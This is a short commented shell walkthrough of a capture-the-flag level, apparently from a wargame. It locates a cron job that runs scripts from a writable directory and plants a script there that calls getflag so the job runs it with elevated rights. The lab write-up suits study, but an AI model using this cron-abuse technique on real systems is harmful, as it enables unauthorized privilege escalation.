# Find any matches with level05 
find / -name "level05" 2>/dev/null

# Read mail
cat /rofs/var/mail/level05

# https://crontab.guru/#*/2_*_*_*_*

# Look at the openarenaserver shell script
cat /usr/sbin/openarenaserver

cd /opt/openarenaserver

# If we look at the acl of this folder, we'll see that level05 and flag05 are allowed to write into this directory
getfacl /opt/openarenaserver

# Create script and change the access rights
echo 'getflag > /opt/openarenaserver/flag' > run.sh
chmod +x run.sh

# Watch carefully and dont lose flag file, after 2 minutes script will delete it!